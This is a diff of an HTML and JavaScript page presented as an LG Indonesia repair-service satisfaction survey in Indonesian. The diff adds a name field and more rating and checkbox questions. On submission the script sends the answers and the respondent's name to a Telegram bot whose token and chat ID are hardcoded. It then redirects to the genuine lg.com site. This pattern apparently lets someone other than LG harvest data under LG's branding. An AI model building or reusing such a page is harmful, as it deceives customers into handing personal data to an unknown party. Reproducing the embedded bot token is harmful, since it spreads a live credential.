@@ -7,106 +7,168 @@
     <style>
         :root { --lg-red: #a50034; --border: #d1d1d1; --text-muted: #666; --blue-link: #0056b3; }
         body { font-family: Arial, sans-serif; margin: 0; background: #fff; color: #000; -webkit-tap-highlight-color: transparent; user-select: none; }
-        
-        /* Header dengan Logo SVG Baru */
-        .header { 
-            padding: 10px 15px; 
-            border-bottom: 2px solid var(--lg-red); 
-            background: #fff;
-            display: flex;
-            align-items: center;
-        }
-        .lg-logo { height: 28px; width: auto; }
-        
+        .header { padding: 12px 20px; border-bottom: 2px solid var(--lg-red); background: #fff; }
+        .lg-text { color: var(--lg-red); font-weight: bold; font-size: 24px; letter-spacing: -1px; font-family: "Arial Black", sans-serif; }
         .container { padding: 15px 20px; max-width: 500px; margin: auto; }
-        .step-indicator { text-align: right; margin-bottom: 20px; }
-        .circle { display: inline-block; width: 19px; height: 19px; border-radius: 50%; border: 1px solid #999; text-align: center; font-size: 10px; line-height: 19px; margin-left: 4px; color: #666; }
+        
+        /* Step Indicator */
+        .step-container { text-align: right; margin-bottom: 25px; }
+        .circle { display: inline-block; width: 19px; height: 19px; border-radius: 50%; border: 1px solid #999; text-align: center; font-size: 10px; line-height: 19px; margin-left: 4px; color: #666; background: #fff; }
         .circle.active { background: #000; color: #fff; border-color: #000; }
         
-        .question { font-size: 13.5px; font-weight: bold; margin-bottom: 15px; line-height: 1.4; color: #000; }
+        /* Questions & Typography */
+        .question { font-size: 13.5px; font-weight: bold; margin-bottom: 12px; line-height: 1.4; color: #000; }
+        .sub-question { font-size: 11px; color: #333; margin-bottom: 15px; line-height: 1.3; font-weight: normal; }
         .asterisk { color: var(--lg-red); font-weight: bold; }
         
+        /* List Groups (Radio & Checkbox) */
         .list-group { border: 1px solid var(--border); border-radius: 4px; overflow: hidden; margin-bottom: 20px; }
         .list-item { display: flex; justify-content: space-between; align-items: center; padding: 14px 18px; border-bottom: 1px solid #eee; cursor: pointer; font-size: 13px; }
         .list-item:last-child { border-bottom: none; }
         
-        .radio-ui { width: 16px; height: 16px; border: 1px solid #aaa; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
-        .list-item.selected .radio-ui { border-color: var(--blue-link); }
+        /* Radio UI styling */
+        .radio-ui { width: 16px; height: 16px; border: 1px solid #aaa; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: #fff; }
+        .list-item.selected .radio-ui { border-color: var(--blue-link); background: #fff; }
         .list-item.selected .radio-ui::after { content: ''; width: 8px; height: 8px; background: var(--blue-link); border-radius: 50%; }
         
-        .nps-grid { display: grid; grid-template-columns: repeat(11, 1fr); border: 1px solid var(--border); border-radius: 4px; overflow: hidden; }
-        .nps-box { text-align: center; padding: 14px 0; border-right: 1px solid var(--border); cursor: pointer; font-size: 11px; }
-        .nps-box.active { background: #f0f0f0; font-weight: bold; }
-        
-        .btn-next { width: 100%; padding: 14px; background: #fff; border: 1px solid var(--border); border-radius: 4px; font-size: 14px; cursor: pointer; margin-top: 10px; }
-        .textarea { width: 100%; height: 85px; border: 1px solid var(--border); border-radius: 4px; padding: 10px; box-sizing: border-box; font-family: inherit; font-size: 13px; margin-top: 10px; resize: none; outline: none; }
-        .textarea:focus { border-color: var(--blue-link); }
+        /* Checkbox UI styling */
+        .checkbox-ui { width: 16px; height: 16px; border: 1px solid #aaa; border-radius: 3px; display: flex; align-items: center; justify-content: center; background: #fff; }
+        .list-item.selected .checkbox-ui { border-color: var(--blue-link); background: var(--blue-link); }
+        .list-item.selected .checkbox-ui::after { content: '✓'; color: #fff; font-size: 11px; font-weight: bold; }
 
-        #lock-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; display: flex; align-items: center; justify-content: center; text-align: center; }
+        /* Input Text Nama */
+        .input-text { width: 100%; border: 1px solid var(--border); border-radius: 4px; padding: 12px; box-sizing: border-box; font-family: inherit; font-size: 13px; margin-bottom: 20px; outline: none; }
+        .input-text:focus { border-color: var(--lg-red); }
+
+        /* NPS Grid 0-10 */
+        .nps-grid { display: grid; grid-template-columns: repeat(11, 1fr); border: 1px solid var(--border); border-radius: 4px; overflow: hidden; background: #fff; }
+        .nps-box { text-align: center; padding: 14px 0; border-right: 1px solid var(--border); cursor: pointer; font-size: 12px; color: #333; }
+        .nps-box:last-child { border-right: none; }
+        .nps-box.active { background: #e6e6e6; font-weight: bold; color: #000; }
+        .nps-labels { display: flex; justify-content: space-between; font-size: 10px; color: #555; margin-top: 5px; line-height: 1.2; margin-bottom: 20px; }
+        .nps-labels div { width: 45%; }
+        
+        /* Buttons */
+        .btn-next { width: 100%; padding: 14px; background: #fff; border: 1px solid var(--border); border-radius: 4px; font-size: 14px; cursor: pointer; margin-top: 15px; }
+        .btn-next:disabled { background: #f5f5f5; color: #aaa; border-color: #e0e0e0; cursor: not-allowed; }
+
+        /* Textarea */
+        .textarea { width: 100%; height: 90px; border: 1px solid var(--border); border-radius: 4px; padding: 10px; box-sizing: border-box; font-family: inherit; font-size: 13px; margin-top: 5px; resize: none; outline: none; }
+        .textarea:focus { border-color: var(--lg-red); }
+        
+        #lock-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; display: flex; align-items: center; justify-content: center; }
         .hidden { display: none !important; }
     </style>
 </head>
 <body>
 
-<div id="lock-screen" class="hidden" onclick="secretReset()">
-    <p style="font-size: 14px; color: #333;">Anda telah mengisi survey ini</p>
-</div>
+<div id="lock-screen" class="hidden" onclick="secretReset()"><p style="font-size: 14px; color: #333;">Anda telah mengisi survey ini</p></div>
 
-<div class="header">
-    <img src="https://files.catbox.moe/qksxi0.svg" class="lg-logo" alt="LG Logo">
-</div>
+<div class="header"><div class="lg-text">LG</div></div>
 
 <div class="container" id="survey-content">
     
     <div id="p1" class="page">
-        <div class="step-indicator"><span class="circle active">1</span><span class="circle">2</span><span class="circle">3</span><span class="circle">4</span><span class="circle">5</span><span class="circle">6</span><span class="circle">7</span></div>
+        <div class="step-container"><span class="circle active">1</span><span class="circle">2</span><span class="circle">3</span><span class="circle">4</span><span class="circle">5</span><span class="circle">6</span><span class="circle">7</span></div>
         <div class="question">1. <span class="asterisk">*</span> Apakah Anda yang menerima layanan perbaikan?</div>
         <div class="list-group">
-            <div class="list-item" onclick="select(this, 'q1')">Ya <div class="radio-ui"></div></div>
-            <div class="list-item" onclick="select(this, 'q1')">Tidak <div class="radio-ui"></div></div>
+            <div class="list-item" onclick="selectRadio(this, 'q1')">Ya <div class="radio-ui"></div></div>
+            <div class="list-item" onclick="selectRadio(this, 'q1')">Tidak <div class="radio-ui"></div></div>
         </div>
-        <button class="btn-next" onclick="goTo(2)">Berikutnya</button>
+
+        <div class="question">Masukkan nama Anda: <span class="asterisk">*</span></div>
+        <input type="text" id="nama_user" class="input-text" placeholder="Tuliskan nama Anda di sini..." oninput="validateName()">
+
+        <button id="btn-p1-next" class="btn-next" onclick="goTo(2)" disabled>Berikutnya</button>
     </div>
 
     <div id="p2" class="page hidden">
-        <div class="step-indicator"><span class="circle">1</span><span class="circle active">2</span><span class="circle">3</span><span class="circle">4</span><span class="circle">5</span><span class="circle">6</span><span class="circle">7</span></div>
-        <div class="question">2. <span class="asterisk">*</span> Seberapa besar kemungkinan Anda merekomendasikan layanan kami? (0-10)</div>
+        <div class="step-container"><span class="circle">1</span><span class="circle active">2</span><span class="circle">3</span><span class="circle">4</span><span class="circle">5</span><span class="circle">6</span><span class="circle">7</span></div>
+        <div class="question">2. <span class="asterisk">*</span> Apakah Anda akan merekomendasikan layanan perbaikan kepada teman dan keluarga Anda?</div>
+        <div class="sub-question">Jawablah dengan skala 0 sampai 10, dengan 0 berarti sama sekali tidak merekomendasikan dan 10 berarti akan merekomendasikan</div>
+        
         <div class="nps-grid" id="nps-container"></div>
-        <button class="btn-next" style="margin-top:20px" onclick="goTo(3)">Berikutnya</button>
+        <div class="nps-labels">
+            <div>(Saya tidak akan merekomendasikannya sama sekali.)</div>
+            <div style="text-align: right;">(Saya akan sangat merekomendasikannya.)</div>
+        </div>
+        
+        <button class="btn-next" onclick="goTo(3)">Berikutnya</button>
     </div>
 
     <div id="p3" class="page hidden">
-        <div class="step-indicator"><span class="circle">1</span><span class="circle">2</span><span class="circle active">3</span><span class="circle">4</span><span class="circle">5</span><span class="circle">6</span><span class="circle">7</span></div>
-        <div class="question">3. <span class="asterisk">*</span> Bagaimana tingkat kepuasan Anda terhadap kecepatan layanan teknisi kami?</div>
+        <div class="step-container"><span class="circle">1</span><span class="circle">2</span><span class="circle active">3</span><span class="circle">4</span><span class="circle">5</span><span class="circle">6</span><span class="circle">7</span></div>
+        <div class="question">3. <span class="asterisk">*</span> Seberapa puaskah Anda dengan proses mengunjungi pusat layanan dan mendaftarkan layanan perbaikan?</div>
         <div class="list-group">
-            <div class="list-item" onclick="select(this, 'q3')">Sangat Puas <div class="radio-ui"></div></div>
-            <div class="list-item" onclick="select(this, 'q3')">Puas <div class="radio-ui"></div></div>
-            <div class="list-item" onclick="select(this, 'q3')">Cukup Puas <div class="radio-ui"></div></div>
-            <div class="list-item" onclick="select(this, 'q3')">Kurang Puas <div class="radio-ui"></div></div>
+            <div class="list-item" onclick="selectRadio(this, 'q3')">Sangat tidak Puas <div class="radio-ui"></div></div>
+            <div class="list-item" onclick="selectRadio(this, 'q3')">Tidak Puas <div class="radio-ui"></div></div>
+            <div class="list-item" onclick="selectRadio(this, 'q3')">Normal <div class="radio-ui"></div></div>
+            <div class="list-item" onclick="selectRadio(this, 'q3')">Puas <div class="radio-ui"></div></div>
+            <div class="list-item" onclick="selectRadio(this, 'q3')">Sangat Puas <div class="radio-ui"></div></div>
         </div>
+        <button class="btn-next" onclick="goTo(4)">Berikutnya</button>
+    </div>
+
+    <div id="p4" class="page hidden">
+        <div class="step-container"><span class="circle">1</span><span class="circle">2</span><span class="circle">3</span><span class="circle active">4</span><span class="circle">5</span><span class="circle">6</span><span class="circle">7</span></div>
+        <div class="question">6. <span class="asterisk">*</span> Seberapa puaskah Anda dengan proses pelayanan perbaikan?</div>
+        <div class="list-group">
+            <div class="list-item" onclick="selectRadio(this, 'q6')">Sangat tidak Puas <div class="radio-ui"></div></div>
+            <div class="list-item" onclick="selectRadio(this, 'q6')">Tidak Puas <div class="radio-ui"></div></div>
+            <div class="list-item" onclick="selectRadio(this, 'q6')">Normal <div class="radio-ui"></div></div>
+            <div class="list-item" onclick="selectRadio(this, 'q6')">Puas <div class="radio-ui"></div></div>
+            <div class="list-item" onclick="selectRadio(this, 'q6')">Sangat Puas <div class="radio-ui"></div></div>
+        </div>
+        <button class="btn-next" onclick="goTo(5)">Berikutnya</button>
+    </div>
+
+    <div id="p5" class="page hidden">
+        <div class="step-container"><span class="circle">1</span><span class="circle">2</span><span class="circle">3</span><span class="circle">4</span><span class="circle active">5</span><span class="circle">6</span><span class="circle">7</span></div>
+        
+        <div class="question">9. <span class="asterisk">*</span> Seberapa puaskah Anda dengan teknisi LG Electronics?</div>
+        <div class="list-group">
+            <div class="list-item" onclick="selectRadio(this, 'q9')">Sangat tidak Puas <div class="radio-ui"></div></div>
+            <div class="list-item" onclick="selectRadio(this, 'q9')">Tidak Puas <div class="radio-ui"></div></div>
+            <div class="list-item" onclick="selectRadio(this, 'q9')">Normal <div class="radio-ui"></div></div>
+            <div class="list-item" onclick="selectRadio(this, 'q9')">Puas <div class="radio-ui"></div></div>
+            <div class="list-item" onclick="selectRadio(this, 'q9')">Sangat Puas <div class="radio-ui"></div></div>
+        </div>
+
+        <div class="question" style="margin-top:20px">12. <span class="asterisk">*</span> Mengapa Anda puas dengan teknisi servis Anda? Pilih semua jawaban.</div>
+        <div class="list-group">
+            <div class="list-item" onclick="toggleCheckbox(this, 'q12')">Jawaban yang tepat <div class="checkbox-ui"></div></div>
+            <div class="list-item" onclick="toggleCheckbox(this, 'q12')">Keterampilan luar biasa untuk memecahkan masalah <div class="checkbox-ui"></div></div>
+            <div class="list-item" onclick="toggleCheckbox(this, 'q12')">Sikap ramah <div class="checkbox-ui"></div></div>
+            <div class="list-item" onclick="toggleCheckbox(this, 'q12')">Layanan tambahan (diagnosis, informasi berguna, dll) <div class="checkbox-ui"></div></div>
+            <div class="list-item" onclick="toggleCheckbox(this, 'q12')">Pakaian dan kebersihan pribadi <div class="checkbox-ui"></div></div>
+            <div class="list-item" onclick="toggleCheckbox(this, 'q12')">Instruksi produk yang berguna <div class="checkbox-ui"></div></div>
+            <div class="list-item" onclick="toggleCheckbox(this, 'q12')">Lain-lain <div class="checkbox-ui"></div></div>
+        </div>
+
+        <div class="question" style="margin-top:20px">13. Jika Anda puas dengan teknisi servis Anda, silakan tinggalkan pendapat Anda.</div>
+        <div class="sub-question" style="margin-bottom: 5px;">Ini akan dibagikan dengan teknisi servis dan sangat membantu untuk meningkatkan kualitas layanan kami.</div>
+        <textarea id="q13_pendapat" class="textarea" placeholder="Tulis pendapat Anda di sini..."></textarea>
+
         <button class="btn-next" onclick="goTo(6)">Berikutnya</button>
     </div>
 
     <div id="p6" class="page hidden">
-        <div class="step-indicator"><span class="circle">1</span><span class="circle">2</span><span class="circle">3</span><span class="circle">4</span><span class="circle">5</span><span class="circle active">6</span><span class="circle">7</span></div>
-        <div class="question">14. <span class="asterisk">*</span> Bapak/Ibu <strong>Pelanggan LG</strong>, kami dapat menghubungi Anda kembali untuk mendengar pendapat Anda. Apakah itu baik-baik saja?</div>
+        <div class="step-container"><span class="circle">1</span><span class="circle">2</span><span class="circle">3</span><span class="circle">4</span><span class="circle">5</span><span class="circle active">6</span><span class="circle">7</span></div>
+        <div class="question">14. <span class="asterisk">*</span> Bapak/Ibu <strong>Pelanggan LG</strong>, bolehkah kami menghubungi Anda kembali?</div>
         <div class="list-group">
-            <div class="list-item" onclick="select(this, 'q14')">Ya <div class="radio-ui"></div></div>
-            <div class="list-item selected" onclick="select(this, 'q14')">Tidak <div class="radio-ui"></div></div>
+            <div class="list-item" onclick="selectRadio(this, 'q14')">Ya <div class="radio-ui"></div></div>
+            <div class="list-item selected" onclick="selectRadio(this, 'q14')">Tidak <div class="radio-ui"></div></div>
         </div>
         
-        <div class="question" style="margin-top:20px">15. Kotak Saran:</div>
-        <textarea id="saran" class="textarea" placeholder="Tulis masukan Anda di sini agar kami bisa melayani lebih baik..."></textarea>
+        <div class="question" style="margin-top:20px">15. Kotak Saran & Masukan:</div>
+        <textarea id="saran" class="textarea" placeholder="Tuliskan saran Anda di sini..."></textarea>
         
-        <button class="btn-next" style="background: var(--lg-red); color: #fff; border: none; font-weight: bold; margin-top: 25px;" onclick="sendToTelegram()">Kirim Survey</button>
+        <button class="btn-next" style="background: var(--lg-red); color: #fff; border: none; font-weight: bold; margin-top: 20px;" onclick="sendData()">Kirim Survey</button>
     </div>
 
     <div id="p7" class="page hidden">
-        <div class="step-indicator"><span class="circle">1</span><span class="circle">2</span><span class="circle">3</span><span class="circle">4</span><span class="circle">5</span><span class="circle">6</span><span class="circle active">7</span></div>
-        <div class="question" style="text-align:center; margin-top: 40px; font-weight: normal;">
-            <strong style="font-size: 16px;">Terima Kasih!</strong><br><br>
-            Jawaban Anda telah berhasil dikirim.
-        </div>
+        <div class="step-container"><span class="circle">1</span><span class="circle">2</span><span class="circle">3</span><span class="circle">4</span><span class="circle">5</span><span class="circle">6</span><span class="circle active">7</span></div>
+        <div class="question" style="text-align:center; margin-top: 30px;">Terima kasih!<br><span style="font-weight: normal; font-size: 13px;">Data Anda telah kami terima.</span></div>
     </div>
 </div>
 
@@ -114,8 +176,16 @@
     const TOKEN = "8734647803:AAHLSgPkyJ3hIz8nOBMvMuC2Pal5jtXYOJQ";
     const CHAT_ID = "-1003793793155";
     
-    let clicks = 0;
-    let data = { q1: "-", q2: "-", q3: "-", q14: "Tidak" };
+    let clickCount = 0;
+    let responses = { 
+        q1: "-", 
+        q2: "-", 
+        q3: "-", 
+        q6: "-", 
+        q9: "-", 
+        q12: [], 
+        q14: "Tidak" 
+    };
 
     function checkLock() {
         const lock = localStorage.getItem('lg_survey_lock');
@@ -127,48 +197,76 @@
     checkLock();
 
     function secretReset() {
-        clicks++;
-        if (clicks >= 7) { localStorage.removeItem('lg_survey_lock'); alert("Akses Terbuka"); location.reload(); }
+        clickCount++;
+        if (clickCount >= 7) { localStorage.removeItem('lg_survey_lock'); alert("Akses Dibuka"); location.reload(); }
     }
 
+    // Fungsi Validasi Nama Halaman Awal
+    function validateName() {
+        const nameInput = document.getElementById('nama_user').value.trim();
+        const nextBtn = document.getElementById('btn-p1-next');
+        nextBtn.disabled = nameInput.length <= 0;
+    }
+
+    // Render Grid NPS 0-10
     const nps = document.getElementById('nps-container');
     for(let i=0; i<=10; i++) {
-        let box = document.createElement('div'); box.className = 'nps-box'; box.innerText = i;
-        box.onclick = function() {
+        let div = document.createElement('div'); div.className = 'nps-box'; div.innerText = i;
+        div.onclick = function() {
             Array.from(nps.children).forEach(c => c.classList.remove('active'));
             this.classList.add('active');
-            data.q2 = i;
+            responses.q2 = i;
         };
-        nps.appendChild(box);
+        nps.appendChild(div);
     }
 
-    function select(el, key) {
+    // Pilihan Single (Radio)
+    function selectRadio(el, key) {
         Array.from(el.parentElement.children).forEach(c => c.classList.remove('selected'));
         el.classList.add('selected');
-        data[key] = el.innerText.trim();
+        responses[key] = el.innerText.trim();
+    }
+
+    // Pilihan Banyak (Checkbox untuk Pertanyaan 12)
+    function toggleCheckbox(el, key) {
+        el.classList.toggle('selected');
+        const value = el.innerText.trim();
+        if (el.classList.contains('selected')) {
+            if (!responses[key].includes(value)) responses[key].push(value);
+        } else {
+            responses[key] = responses[key].filter(item => item !== value);
+        }
     }
 
     function goTo(p) {
         document.querySelectorAll('.page').forEach(page => page.classList.add('hidden'));
         document.getElementById('p' + p).classList.remove('hidden');
-        window.scrollTo(0,0);
+        window.scrollTo(0, 0);
     }
 
-    function sendToTelegram() {
-        const saranText = document.getElementById('saran').value || "Kosong";
-        const report = `🔔 *LG SURVEY REPORT*\n\n` +
-                       `👤 *User:* Pelanggan LG\n` +
-                       `❓ *Q1 (Penerima):* ${data.q1}\n` +
-                       `⭐ *Q2 (NPS Score):* ${data.q2}\n` +
-                       `😊 *Q3 (Kepuasan):* ${data.q3}\n` +
-                       `📞 *Q14 (Hubungi Balik):* ${data.q14}\n` +
-                       `📝 *Saran:* ${saranText}`;
+    function sendData() {
+        const nama = document.getElementById('nama_user').value.trim() || "Pelanggan LG";
+        const pendapatQ13 = document.getElementById('q13_pendapat').value.trim() || "Tidak ada pendapat";
+        const saranQ15 = document.getElementById('saran').value.trim() || "Tidak ada saran";
+        const alasanQ12 = responses.q12.length > 0 ? responses.q12.join(', ') : "-";
+        
+        const text = `🔔 *HASIL SURVEY LG BARU*\n\n` +
+                     `👤 *Nama:* ${nama}\n` +
+                     `1️⃣ *Penerima Servis:* ${responses.q1}\n` +
+                     `2️⃣ *Rekomendasi (NPS):* ${responses.q2}\n` +
+                     `3️⃣ *Kepuasan Daftar:* ${responses.q3}\n` +
+                     `4️⃣ *Kepuasan Proses Servis:* ${responses.q6}\n` +
+                     `5️⃣ *Kepuasan Teknisi:* ${responses.q9}\n` +
+                     `6️⃣ *Alasan Puas (Teknisi):* ${alasanQ12}\n` +
+                     `7️⃣ *Pendapat ttg Teknisi:* ${pendapatQ13}\n` +
+                     `8️⃣ *Hubungi Kembali:* ${responses.q14}\n` +
+                     `📝 *Saran & Masukan:* ${saranQ15}`;
 
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(report)}&parse_mode=Markdown`)
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`)
         .finally(() => {
             localStorage.setItem('lg_survey_lock', new Date().getTime() + (12 * 60 * 60 * 1000));
             goTo(7);
-            setTimeout(() => { window.location.href = "https://www.lg.com/id"; }, 3000);
+            setTimeout(() => { window.location.href = "https://www.lg.com/id"; }, 2500);
         });
     }
 </script>
